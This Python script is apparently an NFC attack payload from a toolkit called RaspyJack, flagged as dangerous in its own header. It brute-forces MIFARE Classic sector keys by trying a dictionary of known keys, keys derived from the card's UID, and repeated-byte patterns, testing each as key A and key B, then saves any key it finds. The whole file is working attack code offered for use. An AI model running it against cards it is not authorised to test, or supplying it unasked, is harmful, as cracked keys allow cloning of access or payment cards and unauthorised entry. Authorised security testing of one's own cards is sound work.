#!/usr/bin/env python3
# @name: NFC Key Brute-force
# @desc: Advanced brute-force beyond dictionary: UID-derived keys, patterns, incremental.
# @category: nfc_rfid
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- NFC Key Brute-force
==========================================
Advanced brute-force beyond dictionary: UID-derived keys, patterns, incremental.

Controls:
  Usage: nfc_bruteforce.py [sector]

  sector defaults to 0 if omitted (0-15). Prompts for card placement,
  then runs the Dictionary -> UID-derived -> Patterns phases, printing
  progress (percent, speed, ETA) periodically to stdout. Press Ctrl-C
  at any time to stop early.
"""
from payloads._web_input import request_input
import os, sys, time
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads.nfc_rfid._nfc_driver import auto_detect, is_classic
from payloads.nfc_rfid._nfc_keys import KNOWN_KEYS, save_keymap

def _prompt(msg):
    try:
        return request_input(msg).strip()
    except EOFError:
        return ""

def _uid_derived_keys(uid):
    """Generate keys derived from UID."""
    keys = []
    uh = uid.hex()
    # UID padded/repeated
    if len(uid) == 4:
        keys.append(uid + uid[:2])
        keys.append(uid[::-1] + uid[:2])
        keys.append(bytes([uid[0]^0xFF, uid[1]^0xFF, uid[2]^0xFF, uid[3]^0xFF, uid[0], uid[1]]))
    # XOR patterns
    for xor_val in [0x00, 0xFF, 0xAA, 0x55]:
        keys.append(bytes([b ^ xor_val for b in uid[:6]]).ljust(6, b"\x00")[:6])
    return keys

def _pattern_keys():
    """Generate pattern-based keys."""
    keys = []
    for b in range(256):
        keys.append(bytes([b] * 6))
    for i in range(6):
        k = [0] * 6
        k[i] = 0xFF
        keys.append(bytes(k))
    return keys

def main():
    try:
        target_sector = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    except ValueError:
        print(f"Usage: {sys.argv[0]} [sector]  (sector must be 0-15)", flush=True)
        return 1
    if not (0 <= target_sector <= 15):
        print("Sector must be between 0 and 15.", flush=True)
        return 1

    print("Detecting reader...", flush=True)
    drv, drv_desc = auto_detect()
    print(f"Reader: {drv_desc}", flush=True)
    if not drv:
        print("No NFC reader connected.", flush=True)
        return 1

    try:
        _prompt("Place card on reader, then press Enter...")
        print("Polling...", flush=True)
        card = drv.read_passive_target(timeout=5.0)
        if not card or not is_classic(card):
            print("Not a MIFARE Classic card." if card else "No card detected.", flush=True)
            return 1

        print(f"Card: {card.uid_hex}  Target sector: {target_sector}", flush=True)

        found_key = None
        block = target_sector * 4
        uid = card.uid
        phases = [
            ("Dictionary", KNOWN_KEYS),
            ("UID-derived", _uid_derived_keys(uid)),
            ("Patterns", _pattern_keys()),
        ]
        total_keys = sum(len(p[1]) for p in phases)
        tested = 0
        start_time = time.time()

        for phase_name, keys in phases:
            if found_key:
                break
            for key in keys:
                tested += 1
                if tested % 25 == 0 or tested == total_keys:
                    elapsed = time.time() - start_time
                    speed = tested / max(0.1, elapsed)
                    eta = int((total_keys - tested) / max(1, speed))
                    pct = tested * 100 // total_keys
                    print(f"  [{pct}%] {phase_name}  key={key.hex().upper()}  "
                          f"{speed:.0f} keys/sec  ETA {eta}s  ({tested}/{total_keys})", flush=True)

                for kt in [0x60, 0x61]:
                    if drv.mifare_auth(block, key, uid, kt):
                        found_key = (key, kt)
                        break
                if found_key:
                    break

        elapsed = int(time.time() - start_time)
        if found_key:
            k, kt = found_key
            kt_name = "A" if kt == 0x60 else "B"
            print(f"FOUND! Key{kt_name}: {k.hex().upper()}  ({tested} keys tried, {elapsed}s)", flush=True)
            save_keymap(card.uid_hex, [{"sector": target_sector, "key": k.hex().upper(),
                                         "key_type": kt_name, "cracked": True}])
        else:
            print(f"Not found ({tested} keys tried, {elapsed}s).", flush=True)
    except KeyboardInterrupt:
        print("\nStopped by user.", flush=True)
    finally:
        if drv:
            drv.close()

    print("Exiting.", flush=True)
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
